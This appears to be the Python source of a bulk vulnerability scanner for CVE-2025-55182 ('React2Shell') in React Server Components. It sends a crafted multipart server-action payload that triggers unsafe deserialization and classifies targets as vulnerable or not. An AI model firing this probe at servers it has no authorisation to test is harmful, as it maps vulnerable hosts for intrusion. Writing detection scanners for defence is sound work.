import asyncio
import aiohttp
import random
import string
import time
from dataclasses import dataclass, field, asdict
from typing import Optional
from datetime import datetime, timezone


@dataclass
class ScanResult:
    url: str
    status: str
    http_code: Optional[int] = None
    detail: str = ""
    content_type: Optional[str] = None
    digest_error: bool = False
    rsc_detected: bool = False
    waf_detected: bool = False
    redirect_location: Optional[str] = None
    scan_time_ms: float = 0.0
    timestamp: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())


class React2ShellScanner:
    CVE = "CVE-2025-55182"
    _BOUNDARY = "WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    _HEADERS = {
        "Next-Action": "x",
        "X-Nextjs-Request-Id": "b5dce965",
        "Next-Router-State-Tree": (
            "%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%2Cnull%2Cnull%2Ctrue%5D"
        ),
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ),
        "Accept": "*/*",
        "Connection": "keep-alive",
    }
    _PAYLOAD = (
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        'Content-Disposition: form-data; name="1"\r\n\r\n'
        "{}\r\n"
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"
        'Content-Disposition: form-data; name="0"\r\n\r\n'
        '["$1:aa:aa"]\r\n'
        "------WebKitFormBoundaryx8jO2oVc6SWP3Sad--\r\n"
    )

    def __init__(self, timeout: int = 10, concurrency: int = 10):
        self.timeout = timeout
        self.concurrency = concurrency

    def _build_headers(self) -> dict:
        return {**self._HEADERS, "Content-Type": f"multipart/form-data; boundary=----{self._BOUNDARY}"}

    @staticmethod
    def _random_path() -> str:
        return "/" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))

    @staticmethod
    def _classify(status: int, ct: str, body: str, headers: dict) -> tuple:
        is_rsc = "text/x-component" in ct.lower()
        digest = 'E{"digest"' in body or '"digest":' in body
        loc = headers.get("Location") or headers.get("X-Action-Redirect")

        if loc and "a=11111" in loc:
            return "VULNERABLE", f"RCE confirmed via Action Redirect: {loc}", True, True, False, loc
        if status == 500 and is_rsc and digest:
            return "VULNERABLE", "RSC digest error triggered - unsafe deserialization confirmed", True, True, False, None
        if status == 500 and is_rsc:
            return "EXPOSED", "RSC endpoint crashed on payload", False, True, False, None
        if status == 500 and digest:
            return "EXPOSED", "Digest error found without RSC content-type", True, False, False, None
        if status == 500:
            return "SUSPICIOUS", "Server returned 500 on RSC payload", False, False, False, None
        if status in (403, 406, 429):
            return "BLOCKED", f"WAF/firewall blocked request (HTTP {status})", False, False, True, None
        if status == 303 and loc:
            return "FILTERED", f"RSC redirect without RCE confirmation: {loc}", False, True, False, loc
        if is_rsc:
            return "INFO", f"RSC detected, payload handled gracefully (HTTP {status})", False, True, False, None
        return "SAFE", f"No RSC activity detected (HTTP {status})", False, False, False, None

    async def _probe(self, session: aiohttp.ClientSession, url: str) -> ScanResult:
        t0 = time.perf_counter()
        result = ScanResult(url=url, status="ERROR")
        try:
            async with session.post(
                url.rstrip("/") + self._random_path(),
                headers=self._build_headers(),
                data=self._PAYLOAD.encode("utf-8"),
                timeout=aiohttp.ClientTimeout(total=self.timeout),
                allow_redirects=False,
                ssl=False,
            ) as resp:
                result.http_code = resp.status
                ct = resp.headers.get("Content-Type", "")
                result.content_type = ct
                body = await resp.text(errors="replace")
                (
                    result.status, result.detail, result.digest_error,
                    result.rsc_detected, result.waf_detected, result.redirect_location,
                ) = self._classify(resp.status, ct, body, dict(resp.headers))
        except aiohttp.ClientConnectorError as e:
            result.detail = f"Connection error: {e}"
        except asyncio.TimeoutError:
            result.detail = f"Timed out after {self.timeout}s"
        except Exception as e:
            result.detail = f"{type(e).__name__}: {e}"
        result.scan_time_ms = round((time.perf_counter() - t0) * 1000, 1)
        return result

    async def scan(self, url: str) -> ScanResult:
        connector = aiohttp.TCPConnector(ssl=False, limit=1)
        async with aiohttp.ClientSession(connector=connector) as session:
            return await self._probe(session, url)

    async def scan_bulk(self, urls: list[str]) -> list[ScanResult]:
        sem = asyncio.Semaphore(self.concurrency)
        connector = aiohttp.TCPConnector(ssl=False, limit=self.concurrency)

        async def _run(session, url):
            async with sem:
                return await self._probe(session, url)

        async with aiohttp.ClientSession(connector=connector) as session:
            return await asyncio.gather(*[_run(session, u) for u in urls])


async def run_as_argus_tool(scan_id, urls, insert_fn, broadcast_fn, timeout=10, concurrency=10):
    scanner = React2ShellScanner(timeout=timeout, concurrency=concurrency)
    results = await scanner.scan_bulk(urls)
    for r in results:
        line = f"{r.url}  [{r.status}]  {r.detail}"
        ev = await insert_fn(scan_id, "react2shell", line, asdict(r))
        await broadcast_fn(scan_id, {"type": "line", **ev})
    return results
